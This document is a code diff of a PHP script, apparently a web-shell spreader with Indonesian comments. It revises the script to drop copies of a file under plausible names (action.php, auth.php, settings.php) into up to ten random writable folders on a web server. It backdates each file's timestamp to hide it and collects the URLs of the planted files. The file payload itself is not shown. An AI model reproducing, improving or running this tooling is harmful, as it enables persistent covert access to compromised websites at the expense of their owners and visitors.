@@ -63,14 +63,14 @@ if (empty($allWritable)) {
 }
 
 shuffle($allWritable);
-$targetFolders = array_slice($allWritable, 0, 10);
 
+$filenames = ['action.php', 'auth.php', 'settings.php'];
 $successCount = 0;
 $uploadedURLs = [];
 
-$filenames = ['index.php', 'action.php', 'auth.php', 'settings.php'];
+foreach ($allWritable as $folder) {
+    if ($successCount >= 10) break; // stop kalau sudah 10 file
 
-foreach ($targetFolders as $folder) {
     $randomDateTime = generate_random_datetime();
     $timestamp = strtotime($randomDateTime);
 
@@ -80,20 +80,21 @@ foreach ($targetFolders as $folder) {
         $originalContent
     );
 
-    foreach ($filenames as $filename) {
-        $target = $folder . DIRECTORY_SEPARATOR . $filename;
-        if (@file_put_contents($target, $modifiedContent)) {
-            @touch($target, $timestamp, $timestamp);
+    // pilih nama file random
+    $filename = $filenames[array_rand($filenames)];
+    $target = $folder . DIRECTORY_SEPARATOR . $filename;
 
-            $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
-            $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
-            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-            $host = $_SERVER['HTTP_HOST'];
-            $url = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $filename;
+    if (@file_put_contents($target, $modifiedContent)) {
+        @touch($target, $timestamp, $timestamp);
 
-            $successCount++;
-            $uploadedURLs[] = $url;
-        }
+        $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
+        $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'];
+        $url = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $filename;
+
+        $successCount++;
+        $uploadedURLs[] = $url;
     }
 }
 
